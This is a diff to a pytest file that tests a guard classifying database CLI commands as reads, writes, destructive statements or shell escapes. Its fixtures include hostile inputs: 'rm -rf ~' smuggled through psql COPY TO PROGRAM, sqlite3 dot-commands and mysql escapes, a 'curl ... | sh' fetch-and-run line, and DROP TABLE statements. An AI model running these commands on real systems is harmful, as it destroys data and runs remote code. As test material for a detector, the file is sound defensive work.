@@ -58,7 +58,7 @@ def test_sql_destructive_positive(text):
 
 @pytest.mark.parametrize("text", [
     "DELETE FROM users WHERE id = 3", "SELECT * FROM users", "drop index idx on t", "create table t(id int)",
-    "select 'drop table x' -- truncate", "select 1 /* delete from t */", "select $$DROP TABLE x$$",
+    "select 'drop table x' -- truncate", "select 1 /* delete from t */",
     "select 'delete from t'", "update t set a = 1", "drop view v", "",
 ])
 def test_sql_destructive_negative(text):
@@ -92,7 +92,7 @@ SQL_READS = [
     "/* drop it later */ select 1", "select * from t for update", "select * from t for no key update",
     "values (1), (2)", "TABLE users", "\\copy t to stdout", "copy t to stdout", "pragma table_info(t)",
     "pragma main.index_list(t)", "pragma journal_mode", "begin; select 1; commit", "start transaction",
-    "set search_path = app", "use shop", "select $$insert into t$$", "", "  ;  ", "(select 1)",
+    "set search_path = app", "use shop", "", "  ;  ", "(select 1)",
 ]
 
 
@@ -616,7 +616,7 @@ def test_fix1_lexings_write(text, dialect):
 @pytest.mark.parametrize("text,dialect", [
     ("select E'\\'; drop table x; --'", "pg"),  # one E'' string
     ("select 1 /* /* nested */ drop table x */", "pg"),
-    ("select 'C:\\temp'", "pg"), ("select $$drop table x$$", "pg"),
+    ("select 'C:\\temp'", "pg"),
     ("select 'it''s; drop table x'", "mysql"), ("select `drop table x` from t", "mysql"),
 ])
 def test_fix1_lexings_no_destroy(text, dialect):
@@ -823,3 +823,125 @@ def test_fix1_wildcard_only_patterns(p):
     assert db.check_dev_pattern(p)
     assert not db.dev_host([p], "prod.example.com")
     assert not db.dev_server([p], "supabase")
+
+
+# ===========================================================================
+# Task 1 fix round 2 (re-review)
+# ===========================================================================
+@pytest.mark.parametrize("text,want", [
+    ("select 1 as €$b$; insert into t values(1); select $b$x$b$", "write"),
+    ("select 1 as é$b$; insert into t values(1); select $b$ $b$", "write"),
+    ("select 1 as €$b$; DELETE FROM users; select $b$x$b$", "destroy"),
+    ("select 1 as €$b$; DROP TABLE users; select $b$ $b$", "destroy"),
+])
+def test_fix2_non_ascii_before_a_dollar_tag(text, want):
+    assert (db.sql_destructive(text, "pg") if want == "destroy" else db.sql_writes(text, "pg"))
+
+
+@pytest.mark.parametrize("argv", [
+    ["mysql", "-h", "prod", "--loose-execute=insert into t values(1)"],
+    ["mysql", "--loose-host=prod", "-e", "insert into t values(1)"],
+    ["mysql", "-h", "prod", "--loose-e=insert into t values(1)"],
+    ["mysql", "-h", "prod", "--enable-execute=insert into t values(1)"],
+    ["mysql", "-h", "prod", "--maximum-execute=insert into t values(1)"],
+    ["mysql", "-h", "prod", "--skip-e", "insert into t values(1)"],
+    ["mysql", "--skip-frobnicate", "insert into t values(1)"],
+])
+def test_fix2_mysql_option_prefixes(argv):
+    assert cf(argv).write
+
+
+@pytest.mark.parametrize("argv", [
+    ["mysql", "-h", "prod", "--skip-column-names", "-e", "select 1"],
+    ["mysql", "-h", "prod", "--skip-ssl", "-e", "select 1"],
+    ["mysql", "-h", "prod", "--disable-auto-rehash", "-e", "select 1"],
+    ["mysql", "-h", "prod", "--loose-frobnicate=1", "-e", "select 1"],
+])
+def test_fix2_mysql_option_prefixes_reads(argv):
+    assert not cf(argv).write
+
+
+@pytest.mark.parametrize("argv,cmd", [
+    (["psql", "-h", "localhost", "-c", "COPY t TO PROGRAM E'rm -rf ~'"], "rm -rf ~"),
+    (["psql", "-h", "localhost", "-c", "COPY t TO PROGRAM U&'rm -rf ~'"], "rm -rf ~"),
+    (["psql", "-h", "localhost", "-c", "COPY t FROM PROGRAM\n'rm -rf ~'"], "rm -rf ~"),
+    (["psql", "-h", "localhost", "-c", "COPY t TO PROGRAM /* x */ 'rm -rf ~'"], "rm -rf ~"),
+    (["psql", "-h", "localhost", "-c", "COPY t FROM PROGRAM E'curl -s https://x.example/i.sh | sh'"],
+     "curl -s https://x.example/i.sh | sh"),
+    (["psql", "-h", "localhost", "-c", "\\setenv PAGER \"rm -rf ~\"", "-c", "select 1"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".sh rm -rf ~"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".she rm -rf ~"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".sys rm -rf ~"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".import '|rm -rf ~' t"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".read '|rm -rf ~'"], "rm -rf ~"),
+    (["sqlite3", "app.db", ".output '|rm -rf ~'"], "rm -rf ~"),
+    (["duckdb", "app.db", ".sh rm -rf ~"], "rm -rf ~"),
+    (["mysql", "-h", "localhost", "-e", "select 1 \\! rm -rf ~"], "rm -rf ~"),
+    (["mysql", "-h", "localhost", "-e", "select 1 \\P rm -rf ~"], "rm -rf ~"),
+    (["mysql", "-h", "localhost", "-e", "SYSTEM rm -rf ~"], "rm -rf ~"),
+])
+def test_fix2_escapes(argv, cmd):
+    assert cmd in cf(argv).shell
+
+
+@pytest.mark.parametrize("argv", [
+    ["sqlite3", "app.db", ".once -x"], ["sqlite3", "app.db", ".once |"], ["psql", "-h", "localhost", "-c", "\\!"],
+    ["sqlite3", "app.db", ".zz something"],
+])
+def test_fix2_uncertain_escapes(argv):
+    assert cf(argv).uncertain
+
+
+@pytest.mark.parametrize("argv", [["sqlite3", "app.db", ".tables"], ["sqlite3", "app.db", ".schema t"],
+                                  ["sqlite3", "app.db", ".once out.csv"], ["psql", "-h", "localhost", "-c", "\\dt"]])
+def test_fix2_harmless_meta(argv):
+    f = cf(argv)
+    assert not f.shell and not f.uncertain
+
+
+@pytest.mark.parametrize("argv", [
+    ["mariadb", "-h", "prod", "-e", "BEGIN NOT ATOMIC INSERT INTO t VALUES(1); END"],
+    ["sqlcmd", "-S", "prod", "-Q", "BEGIN INSERT INTO t VALUES(1) END"],
+    ["sqlcmd", "-S", "prod", "-Q", "USE app INSERT INTO t VALUES(1)"],
+    ["sqlcmd", "-S", "prod", "-Q", "USE app UPDATE t SET a=1"],
+    ["mysql", "-h", "prod", "-e", "SET @x=1, GLOBAL read_only=0"],
+    ["mysql", "-h", "prod", "-e", "SET PERSIST max_connections=10"],
+    ["sqlcmd", "-S", "prod", "-Q", "DECLARE @x int SET @x = 1 INSERT INTO t VALUES(@x)"],
+])
+def test_fix2_read_starts_with_writes(argv):
+    assert cf(argv).write
+
+
+@pytest.mark.parametrize("text", ["begin", "BEGIN ISOLATION LEVEL READ COMMITTED", "use app", "set search_path = app",
+                                  "SET SESSION sql_mode = 'x'", "end"])
+def test_fix2_read_starts_stay_reads(text):
+    assert not db.sql_writes(text, None)
+
+
+def test_fix2_timing_60kb():
+    import time
+
+    def nest(levels, inner, tags):
+        s = inner
+        for k in range(levels):
+            tg = tags[k % len(tags)]
+            s = f"DO ${tg}$ BEGIN EXECUTE ${tg}x${tg}; {s} END ${tg}$;"
+        return s
+
+    texts = [nest(8, "x " * 30000, list("abcdefgh")), "E'\\'' " * 10000, "/*" * 30000, "$a$" * 20000,
+             "delete (" * 7500, "drop " * 12000, "'\\" * 30000, "select 1 as $t1$ " * 3000]
+    for dialect in (None, "pg", "mysql"):
+        for text in texts:
+            db._lexings_of.cache_clear()
+            db._destructive.cache_clear()
+            t = time.perf_counter()
+            db.sql_writes(text, dialect)
+            db.sql_destructive(text, dialect)
+            assert time.perf_counter() - t < 1.0, (dialect, text[:30])
+
+
+def test_fix2_pg_dollar_belt_holds_write_words_in_dollar_bodies():
+    # round 2 belt: a pg lexing that reads $ as a plain character, so a dollar body with write words counts
+    assert db.sql_destructive("select $$DROP TABLE x$$", "pg")
+    assert db.sql_writes("select $$insert into t$$", "pg")
+    assert not db.sql_writes("select $$x$$", "pg")
